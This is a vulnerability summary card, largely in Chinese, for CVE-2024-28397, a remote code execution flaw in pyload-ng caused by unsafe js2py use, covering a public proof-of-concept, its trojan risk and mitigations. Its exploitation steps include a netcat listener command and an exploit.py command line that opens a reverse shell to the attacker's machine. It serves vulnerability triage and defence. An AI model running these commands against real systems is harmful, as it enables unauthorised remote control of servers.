## CVE-2024-28397 - pyload-ng Remote Code Execution (RCE)

**漏洞编号:** CVE-2024-28397

**漏洞类型:** Remote Code Execution (RCE)

**影响应用:** pyload-ng

**危害等级:** Critical

**CVSS评分:** N/A

**影响版本:** Unspecified, but likely affects versions using js2py insecurely

**利用条件:** Requires access to the /run_code endpoint. Requires attacker to register and authenticate.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2024-28397是pyload-ng中由于不安全地使用js2py而导致的远程代码执行漏洞。该漏洞允许经过身份验证的远程攻击者通过构造恶意的JavaScript负载来执行任意系统命令。POC利用了pyload-ng的/run_code端点，该端点允许用户执行JavaScript代码。POC首先向目标服务器注册并登录，然后使用精心设计的JavaScript有效负载通过/run_code端点发送请求。该有效负载使用js2py库执行系统命令，在本例中，它会建立一个反向shell连接到攻击者的机器上。POC代码非常有效，只需最少的配置即可利用该漏洞。该POC提供了一个明确的示例，说明了如何利用此漏洞，并包含有关如何设置所需组件（如netcat监听器）的说明。该漏洞的成功利用将使攻击者能够完全控制受影响的系统，从而可能导致数据泄露、系统中断或其他恶意活动。

利用步骤：
1. 使用提供的exploit.py脚本，指定目标URL、攻击者的IP地址和端口、注册用户名和密码。
2. 在攻击者的机器上启动一个netcat监听器：`nc -lvnp 4444`。
3. 运行exploit.py脚本：`python3 exploit.py -url http://target.com -lhost YOUR_IP -lport 4444 -user attacker -passwd attacker123`。
4. 如果漏洞利用成功，攻击者将在其netcat监听器上收到一个反向shell。

投毒风险分析：
该POC的投毒风险为中等，约为40%。虽然POC代码相对清晰，并且没有明显的恶意行为，但它包含以下风险因素：
1. 该POC使用requests库发送HTTP请求。虽然requests库本身是安全的，但它可能被滥用以发送恶意请求或窃取敏感信息。
2. 该POC执行任意系统命令。虽然这些命令旨在建立一个反向shell，但它们可能被修改为执行其他恶意操作，如删除文件、安装恶意软件或传播到其他系统。
3. 有效载荷包含一个混淆的JavaScript字符串，这使得难以检测恶意代码。虽然JavaScript有效负载的目的是利用RCE漏洞，但它可能被修改为执行其他恶意操作。

缓解措施：
1. 始终使用最新版本的pyload-ng。
2. 确保pyload-ng的/run_code端点受到适当的身份验证和授权保护。
3. 监控pyload-ng服务器上的可疑活动。

**项目地址:** https://github.com/Uday2002/CVE-2024-28397

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-28397
